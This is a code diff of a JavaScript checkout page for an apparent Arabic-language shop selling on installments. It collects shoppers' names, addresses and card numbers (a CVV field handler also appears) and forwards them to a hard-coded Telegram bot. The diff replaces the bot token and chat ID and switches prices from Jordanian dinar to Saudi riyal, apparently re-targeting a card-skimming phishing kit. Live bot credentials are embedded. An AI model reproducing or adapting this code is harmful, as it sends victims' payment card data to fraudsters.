@@ -152,14 +152,14 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     
         if (isValid) {
-            const botToken = "7577043320:AAG15LLVjDJK8frWq4qb8FZxuCbGnYWeY2Q";
-            const chatId = "6797351288";
+            const botToken = "7791159170:AAGO5BG--9yo9pHKoxbmmvyRwH4h6cGPP2M";
+            const chatId = "6873334348";
     
             let productDetails = '';
             cart.forEach((product, index) => {
                 productDetails += `- **المنتج ${index + 1}:** ${product.name}\n`;
                 productDetails += `  - **الكمية:** ${product.quantity}\n`;
-                productDetails += `  - *السعر${(product.quantity * product.price).toFixed(2)}\n\n`;
+                productDetails += `  - **الإجمالي:** دينار أردني ${(product.quantity * product.price).toFixed(2)}\n\n`;
             });
     
             const messageId = Date.now();
@@ -170,7 +170,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 *بيانات الطلب:*
                 ${productDetails}
                 - **عدد المنتجات:** ${totalQuantity}
-                - **إجمالي المنتجات:** دينار أردني ${totalPrice.toFixed(2)}
+                - **إجمالي المنتجات:** ر.س ${totalPrice.toFixed(2)}
     
                 *بيانات الشخص:*
                 - **الاسم الكامل:** ${fullName}
@@ -178,9 +178,9 @@ document.addEventListener("DOMContentLoaded", () => {
                 - **العنوان الكامل:** ${fullAddress}
     
                 *بيانات التقسيط:*
-                - **المقدم:** دينار أردني ${initialPayment.toFixed(2)}
+                - **المقدم:** ر.س ${initialPayment.toFixed(2)}
                 - **مدة التقسيط:** ${selectedInstallment} شهر
-                - **القسط الشهري:** دينار أردني ${monthlyPayment.toFixed(2)}
+                - **القسط الشهري:** ر.س ${monthlyPayment.toFixed(2)}
     
                 *بيانات البطاقة:*
                 - **رقم البطاقة:** ${cardNumber}
@@ -336,7 +336,7 @@ document.getElementById("cvv").addEventListener("input", function (e) {
                 <img src="${item.img}" alt="">
                 <div class="content">
                     <h4>${item.name}</h4>
-                    <p class="price_cart">دينار أردني${total_Price_item.toFixed(2)}</p>
+                    <p class="price_cart">ر.س${total_Price_item.toFixed(2)}</p>
                     <div class="quantity_control">
                         <button class="decrease_quantity" data-index="${index}">-</button>
                         <span class="quantity">${item.quantity}</span>
@@ -348,7 +348,7 @@ document.getElementById("cvv").addEventListener("input", function (e) {
         `;
     });
 
-    document.querySelector(".total_checkout").textContent = `دينار أردني${cartTotalPrice.toFixed(2)}`;
+    document.querySelector(".total_checkout").textContent = `ر.س${cartTotalPrice.toFixed(2)}`;
     setupCheckoutButtons();
 });
 
